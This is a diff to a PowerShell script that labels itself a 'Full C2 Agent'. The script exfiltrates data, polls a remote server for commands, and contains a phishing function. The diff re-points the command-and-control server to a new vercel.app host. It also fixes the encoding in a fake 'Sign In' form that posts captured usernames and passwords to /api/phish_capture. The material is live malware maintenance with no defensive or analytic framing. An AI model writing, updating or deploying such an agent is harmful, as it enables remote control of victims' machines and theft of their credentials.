@@ -1,8 +1,8 @@
-ï»¿# BomKaosKaki.ps1 - Full C2 Agent with Command Polling (Fixed)
+# BomKaosKaki.ps1 - Full C2 Agent with Command Polling (Fixed)
 # Two-way communication: sends heartbeats & exfil, polls for commands
 
 # ============ CONFIGURATION ============
-$C2Server = "https://bom-kaos-kaki.vercel.app"
+$C2Server = "https://deploy-delta-eosin.vercel.app"
 $PollInterval = 15  # seconds between command polling
 $HeartbeatInterval = 30  # seconds between heartbeats
 
@@ -592,7 +592,7 @@ function Invoke-Phishing {
         <p>Please enter your credentials</p>
         <form method="POST" action="/api/phish_capture">
             <div class="input-group"><label>Username</label><input type="text" name="username" placeholder="admin" required></div>
-            <div class="input-group"><label>Password</label><input type="password" name="password" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" required></div>
+            <div class="input-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
             <button type="submit" class="btn">Sign In</button>
             <div class="error">Invalid credentials. Please try again.</div>
         </form>
